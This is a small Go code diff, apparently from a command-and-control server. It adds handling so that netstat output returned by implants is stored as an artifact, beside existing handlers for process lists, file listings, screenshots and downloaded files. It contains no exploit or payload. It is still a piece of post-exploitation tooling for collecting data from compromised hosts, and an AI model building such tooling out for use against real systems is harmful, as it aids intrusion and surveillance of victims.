@@ -7,6 +7,7 @@ package main
 // The BOF output formats (from examples/*.c) are:
 //   file_list:    "CWD: <path>\r\nD\tname\tsize\tepoch\r\n..." (text -> meta)
 //   proc_list:    "name\tpid\tppid\tthreads\r\n..."           (text -> meta)
+//   netstat:      "PROTO\tLOCAL\tREMOTE\tPID\tSTATE\r\n..."    (text -> meta)
 //   screenshot:   "=== SCREENSHOT: <W>x<H> ===\n<b64 BMP>"     (decode -> blob)
 //   file_download:"=== FILE: <path> (n bytes) ===\r\n<b64>"   (decode -> blob)
 //
@@ -33,6 +34,9 @@ func captureArtifact(bofName string, implantID uint64, output string) {
 
 	case "proc_list":
 		store.PutArtifact(implantID, KindProcList, "", output, nil)
+
+	case "netstat":
+		store.PutArtifact(implantID, KindNetList, "", output, nil)
 
 	case "screenshot":
 		blob, ok := extractB64Body(output, "=== SCREENSHOT:")
